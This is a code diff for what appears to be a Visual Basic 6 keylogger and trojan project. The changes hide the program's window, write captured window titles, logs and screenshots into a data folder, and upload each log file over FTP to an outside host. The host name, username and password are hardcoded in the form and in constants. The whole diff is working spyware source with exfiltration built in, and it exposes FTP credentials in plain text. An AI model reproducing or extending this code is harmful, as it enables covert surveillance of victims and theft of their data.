@@ -1,14 +1,29 @@
 VERSION 5.00
+Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
 Begin VB.Form Form1 
    Caption         =   "Form1"
-   ClientHeight    =   4440
+   ClientHeight    =   4275
    ClientLeft      =   165
    ClientTop       =   555
    ClientWidth     =   10545
    LinkTopic       =   "Form1"
-   ScaleHeight     =   4440
+   ScaleHeight     =   4275
    ScaleWidth      =   10545
    StartUpPosition =   3  'Windows Default
+   Visible         =   0   'False
+   Begin InetCtlsObjects.Inet Inet1 
+      Left            =   6840
+      Top             =   3600
+      _ExtentX        =   1005
+      _ExtentY        =   1005
+      _Version        =   393216
+      Protocol        =   2
+      RemoteHost      =   "ftp.projetotrojan.esy.es"
+      RemotePort      =   21
+      URL             =   "ftp://u752146667.root:qweasd3274@ftp.projetotrojan.esy.es"
+      UserName        =   "u752146667.root"
+      Password        =   "qweasd3274"
+   End
    Begin VB.Timer Timer3 
       Interval        =   1000
       Left            =   5760
@@ -49,9 +64,14 @@ Dim num_janela As Long
 Dim ctd As Integer
 
 'time in minutes to perform the function that
-Const X_WRITE_DISK = 1  'write data in disk
+Const X_WRITE_DISK = 0.1  'write data in disk
 Const X_SCREENSHOT = 1  'take an screenshot
-Const X_SEND_FTP = 1 'send all captured data to ftp
+'Const X_SEND_FTP = 1 send all captured data to ftp - not implemented
+
+'Credentials for ftp login below
+Const FTP_HOST = "ftp.projetotrojan.esy.es" 'ftp host
+Const FTP_USER = "u752146667.root" 'ftp user
+Const FTP_PASS = "qweasd3274" 'ftp pass
 
 'read current window title
 Private Function GetActiveWindowTitle() As String
@@ -195,6 +215,18 @@ End Function
 
 
 Private Sub Form_Load()
+If Dir$(App.Path + "\data_klg") = "" Then
+    MkDir$ App.Path + "\data_klg"
+End If
+
+
+
+
+'Set ftp credentials to VB6 Ftp Component
+'Inet1.URL = FTP_HOST
+'Inet1.UserName = FTP_USER
+'Inet1.Password = FTP_PASS
+
 'load basic data from the system for hack
 Text1.Text = Text1.Text + "Hora de inicialização:" + Date$ + "-" + Time$ + vbCrLf + "bloco possivelmente contendo o ip:" + vbCrLf + vbCrLf + "::::" + vbCrLf + getIpAdress() + vbCrLf + "::::" + vbCrLf + vbCrLf
 End Sub
@@ -235,13 +267,28 @@ End Sub
 Private Sub write_to_buffer()
     Dim fso As New FileSystemObject
     Dim arqtxt As TextStream
-    Set arqtxt = fso.CreateTextFile(App.Path + "/" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_"), True)
+    Dim filename As String
+    filename = Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
+    Set arqtxt = fso.CreateTextFile(App.Path + "/data_klg/" + filename, True)
     arqtxt.Write (Text1.Text)
     Text1.Text = ""
+    send_ftp_data filename
 End Sub
 
 Private Sub take_a_screenshot()
-    SavePicture CaptureScreen(), App.Path + "/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
+    SavePicture CaptureScreen(), App.Path + "/data_klg/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
+End Sub
+
+Private Sub send_ftp_data(ByVal filename As String)
+    If Inet1.StillExecuting Then
+        Inet1.Cancel
+    End If
+    
+    Inet1.Execute , "send " & App.Path & "\data_klg\" & filename & " " & filename
+    
+    Do While Inet1.StillExecuting
+        DoEvents
+    Loop
 End Sub
 
 'this logical is simple
